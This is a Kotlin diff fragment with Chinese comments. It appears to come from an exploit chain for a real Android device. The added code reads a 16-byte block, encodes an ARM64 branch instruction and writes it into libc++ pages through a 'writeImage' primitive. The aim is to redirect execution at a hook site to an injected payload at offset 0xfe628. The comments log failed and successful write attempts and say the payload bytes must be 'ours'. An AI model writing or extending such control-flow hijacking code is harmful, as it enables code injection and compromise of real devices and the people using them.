@@ -853,6 +853,32 @@ if (branchFix == 0 && hookPlanWords != null && hookPlanWords.size >= 4) {
     step("typed: hook site after=" + (blk?.joinToString(" ") { b -> "%02x".format(b) } ?: "unreadable"))
 }
 val hookLanding = if (hookPlanWords != null && hookPlanWords.size >= 4) hookPlanWords[3] else 0xFE628L
+/*
+ * 站点改写改走 image 路径：writeBlock 报成功却在任何偏移都看不到效果（本会话三组对照），
+ * 而 writeImage 已证能落地（载荷字符串确实出现在 libc++ 页内）。这里用同一路径写那 16 字节。
+ */
+if (hookPlanWords != null && hookPlanWords.size >= 4) {
+    runCatching {
+        val siteOff = hookPlanWords[2]
+        val landOff = hookPlanWords[3]
+        val brAt = siteOff + 12L
+        val blk0 = brAt - (brAt % 16L)
+        val base = hook.readBlock(hookDoor, blk0)
+        if (base != null) {
+            val imm = ((landOff - brAt) shr 2) and 0x03FFFFFFL
+            val word = 0x14000000L or imm
+            val at = (brAt - blk0).toInt()
+            base[at] = (word and 0xFF).toByte()
+            base[at + 1] = ((word shr 8) and 0xFF).toByte()
+            base[at + 2] = ((word shr 16) and 0xFF).toByte()
+            base[at + 3] = ((word shr 24) and 0xFF).toByte()
+            val imWrote = hook.writeImage(base, blk0, 16L, saInit(hook.nextSequence()))
+            step("typed: hook site image wrote=" + imWrote + " word=0x" + word.toString(16) + " block=" + blk0)
+        } else {
+            step("typed: hook site image skipped: block unreadable")
+        }
+    }.onFailure { problem -> step("typed: hook site image refused " + problem.javaClass.simpleName) }
+}
             val hookWrote = hook.writeHook(16L, saInit())  /* 这套原语的单位是 16 字节（8 会被 BadWidth 拒 —— 2026-10-15 真机证据） */
             step("typed: hook wrote=" + hookWrote + " code=" + hook.lastCode + " refusal=" + hook.lastRefusal)
             /* 载荷本体：钩子跳到 payload_file=0xfe628 时那里必须是我们的字节（此前只写了站点 ✗）。 */
